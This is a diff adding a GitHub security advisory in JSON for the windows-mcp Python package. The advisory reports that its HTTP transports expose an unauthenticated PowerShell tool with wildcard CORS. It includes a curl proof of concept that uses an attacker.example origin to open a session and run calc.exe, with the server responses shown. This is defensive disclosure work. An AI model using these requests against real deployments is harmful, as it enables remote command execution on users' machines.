@@ -1,0 +1,53 @@
+{
+  "id": "GHSA-vrxg-gm77-7q5g",
+  "modified": "2026-05-21T17:00:10.289228093Z",
+  "published": "2026-05-21T16:46:02Z",
+  "summary": "Windows-MCP: HTTP transports expose unauthenticated PowerShell control with wildcard CORS",
+  "details": "HTTP transports expose unauthenticated PowerShell control with wildcard CORS\n\nThere is an issue in the SSE and Streamable HTTP transport modes. The default stdio mode is not affected, but the documented HTTP modes expose the MCP control plane without authentication and add wildcard CORS handling around it. The same server exposes the `PowerShell` tool, which executes caller-controlled commands as the Windows user running Windows-MCP.\n\nRelevant source:\n\n- `src/windows_mcp/__main__.py:37-42`: `_http_middleware()` installs `OptionsMiddleware` and `CORSMiddleware` with `allow_origins=[\"*\"]`, `allow_methods=[\"*\"]`, and `allow_headers=[\"*\"]`.\n- `src/windows_mcp/__main__.py:45-72`: `OptionsMiddleware` responds to every `OPTIONS` request with wildcard `Access-Control-Allow-Origin`, `Access-Control-Allow-Methods`, and `Access-Control-Allow-Headers`.\n- `src/windows_mcp/__main__.py:75-113`: `_build_mcp()` constructs `FastMCP(name=\"windows-mcp\", ...)` without an auth provider.\n- `src/windows_mcp/__main__.py:139-151`: both `sse` and `streamable-http` call `mcp.run(...)` with that middleware and no application-level auth/security settings.\n- `src/windows_mcp/tools/shell.py:10-24`: registers the `PowerShell` tool and passes caller-controlled `command` to `PowerShellExecutor.execute_command`.\n- `src/windows_mcp/desktop/powershell.py:176-204`: executes that command through PowerShell `-EncodedCommand`.\n- `README.md:421-424` and `433-434`: documents the HTTP transports and describes Streamable HTTP as network-accessible HTTP streaming.\n\nIn an affected configuration, a client that can reach `http://localhost:8000/mcp` can initialize an MCP session and invoke `tools/call` for `PowerShell`. The issue is not just that PowerShell is powerful; it is that the HTTP control plane around that tool is unauthenticated and configured with wildcard CORS.\n\n## Root cause\n\nThe HTTP transport entry points compose two independent design decisions that fail-open together: the FastMCP instance is built without any authentication provider, and the middleware stack installs blanket wildcard CORS (`allow_origins=*`, `allow_methods=*`, `allow_headers=*`) that explicitly permits cross-origin browsers and any non-browser HTTP client to reach the MCP control plane. Either one alone would be a partial defense; together, the unauthenticated control plane is reachable from arbitrary origins, with no host-validation, no token check, and no DNS-rebinding mitigation between an attacker's request and the registered `PowerShell` tool. The structural fix is to require an auth provider (token, mTLS, or local-only secret handshake) on the HTTP transports and to scope CORS to a specific operator-configured allowlist rather than applying wildcard policy to a tool surface that includes shell execution.\n\n## Auth boundary violated\n\n**Boundary:** Network trust domain (an unauthenticated remote/cross-origin caller is treated as if it were a trusted local MCP client with rights to invoke privileged shell tools).\n\n**Respected at:** stdio transport path (`src/windows_mcp/__main__.py` stdio branch) — the default transport relies on parent-process pipe ownership for caller identity, which is a real OS-level boundary.\n\n**Violated at:** `src/windows_mcp/__main__.py:139-151` (SSE and Streamable HTTP branches call `mcp.run(...)` with the wildcard-CORS middleware installed at `:37-42` and no auth provider attached at `:75-113`). The boundary is silently dropped: there is no code path between the inbound HTTP request and `tools/call` for `PowerShell` (`src/windows_mcp/tools/shell.py:10-24` → `src/windows_mcp/desktop/powershell.py:176-204`) that asserts caller identity or origin.\n\nMinimal protocol proof from a matching FastMCP 3.2.4 harness with the same middleware posture:\n\n```text\n$ curl -i -s -X OPTIONS 'http://127.0.0.1:18123/mcp/' \\\n  -H 'Origin: https://attacker.example' \\\n  -H 'Access-Control-Request-Method: POST' \\\n  -H 'Access-Control-Request-Headers: content-type,mcp-session-id'\n\nHTTP/1.1 200 OK\naccess-control-allow-origin: *\naccess-control-allow-methods: *\naccess-control-allow-headers: *\n\n$ curl -i -s 'http://127.0.0.1:18123/mcp' \\\n  -H 'Origin: https://attacker.example' \\\n  -H 'Content-Type: application/json' \\\n  -H 'Accept: application/json, text/event-stream' \\\n  --data '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"initialize\",\"params\":{\"protocolVersion\":\"2025-06-18\",\"capabilities\":{},\"clientInfo\":{\"name\":\"evil-page\",\"version\":\"1\"}}}'\n\nHTTP/1.1 200 OK\ncontent-type: text/event-stream\nmcp-session-id: c67be0098b7643eb961b2fd0185ee043\naccess-control-allow-origin: *\n\n$ curl -i -s 'http://127.0.0.1:18123/mcp' \\\n  -H 'Origin: https://attacker.example' \\\n  -H 'Mcp-Session-Id: c67be0098b7643eb961b2fd0185ee043' \\\n  -H 'Content-Type: application/json' \\\n  -H 'Accept: application/json, text/event-stream' \\\n  --data '{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"PowerShell\",\"arguments\":{\"command\":\"calc.exe\",\"timeout\":30}}}'\n\nHTTP/1.1 200 OK\ncontent-type: text/event-stream\nmcp-session-id: c67be0098b7643eb961b2fd0185ee043\naccess-control-allow-origin: *\n\nevent: message\ndata: {\"jsonrpc\":\"2.0\",\"id\":2,\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"executed: calc.exe\"}],\"structuredContent\":{\"result\":\"executed: calc.exe\"},\"isError\":false}}\n```\n\n## Impact\n\nFor affected HTTP-transport deployments, successful exploitation gives arbitrary PowerShell execution as the user running Windows-MCP. There is an important browser caveat: current Chrome/Edge Local Network Access / Private Network Access behavior may block or prompt for public-site-to-localhost requests because this middleware does not return `Access-Control-Allow-Private-Network: true`. The exposure still applies to same-origin/private-origin contexts, browsers or apps without that enforcement, user-approved local-network prompts, browser extensions, and non-browser HTTP clients.\n\nSuggested fix: require authentication for HTTP transports, remove wildcard CORS from MCP control endpoints, restrict origins to explicit trusted clients, and enable/propagate transport security settings such as host validation. If unauthenticated HTTP is retained for development, I would make it an explicit unsafe flag and add regression tests for cross-origin `OPTIONS`, `initialize`, and `tools/call`.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "windows-mcp",
+        "purl": "pkg:pypi/windows-mcp"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.7.5"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.6.5",
+        "0.6.6",
+        "0.6.7",
+        "0.6.8",
+        "0.6.9",
+        "0.7.0",
+        "0.7.1",
+        "0.7.3",
+        "0.7.4"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-vrxg-gm77-7q5g/GHSA-vrxg-gm77-7q5g.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/CursorTouch/Windows-MCP/security/advisories/GHSA-vrxg-gm77-7q5g"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/CursorTouch/Windows-MCP"
+    }
+  ]
+}
